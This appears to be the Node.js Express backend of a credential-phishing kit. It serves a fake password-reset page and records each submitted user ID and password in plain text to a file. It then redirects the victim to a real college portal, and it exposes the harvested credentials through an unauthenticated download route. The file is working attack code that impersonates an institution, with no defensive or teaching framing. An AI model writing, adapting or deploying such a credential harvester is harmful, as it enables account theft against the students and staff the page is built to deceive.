const http = require("http");
const https = require("https");
const host = 'localhost';

//var alert = require('alert');
var fs = require("fs");
var express = require('express');
const { userInfo } = require("os");
var key = fs.readFileSync(__dirname + '/selfsigned.key');
var cert = fs.readFileSync(__dirname + '/selfsigned.crt');
var options = {
    key: key,
    cert: cert
  };
app = express(); 
app.use(express.json());
app.use(express.urlencoded());
app.use( express.static(__dirname + '/public'));
app.set("view options", {layout: false});
app.get('/', function(req, res) {
    res.sendFile(__dirname + '/public/pwm-reset.html');
});
app.get('/userdata', function(req,res){
    res.download(__dirname + '/userdata.txt');
});
var filename = "./userdata.txt"
app.post('/post-test', (req, res) => {
    var data = req.body.user_id + " - " + req.body.password1
    fs.appendFile(filename, data+"\n", function (err) {
        if (err) throw err;
        
        console.log('It\'s saved!');
        //alert("Password Reset")
        res.redirect('https://my.macomb.edu/');
      });  
});
var server = https.createServer(options, app);
var httpServer = http.createServer(app);
httpServer.listen(8080, () => {
    console.log("Http server listing on port : " + 8080)
  });
server.listen(3001, () => {
    console.log("Https server listing on port : " + 3001)
});

